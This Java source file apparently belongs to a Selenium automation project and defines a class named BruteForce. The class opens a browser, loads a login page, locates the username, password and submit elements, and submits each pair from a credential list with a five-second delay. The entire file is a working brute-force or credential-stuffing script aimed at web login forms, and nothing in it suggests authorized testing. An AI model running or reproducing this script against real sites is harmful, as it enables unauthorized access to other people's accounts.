package com.mert;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

import java.util.List;

public class BruteForce {
    private WebElement usernameInput;
    private WebElement passwordInput;
    private WebElement button;
    private WebDriver driver;
    private String baseUrl;

    public BruteForce() {
        driver = new ChromeDriver();
        driver.manage().window().maximize();

        baseUrl = Login.getBaseUrlByIndex(2);
    }

    private void FindInputsOnPage(List<WebElement> inputs) {
        for (WebElement item : inputs) {
            if ((item.getAttribute("name").equals("username") ||
                    item.getAttribute("name").equals("email")) &&
                    usernameInput == null)
                usernameInput = item;
            if (item.getAttribute("type").equals("password"))
                passwordInput = item;
            if (item.getAttribute("type").equals("submit"))
                button = item;
        }
        if (button == null)
            button = driver.findElement(By.tagName("button"));
    }

    public void startForcing() throws InterruptedException {
        driver.get(baseUrl);

        List<WebElement> inputs = driver.findElements(By.tagName("input"));
        FindInputsOnPage(inputs);

        for (Login login : Login.getLoginCredentials()) {
            usernameInput.sendKeys(login.getUsername());
            passwordInput.sendKeys(login.getPaswd());
            button.click();
            Thread.sleep(5000);
            usernameInput.clear();
            passwordInput.clear();
        }
    }

}
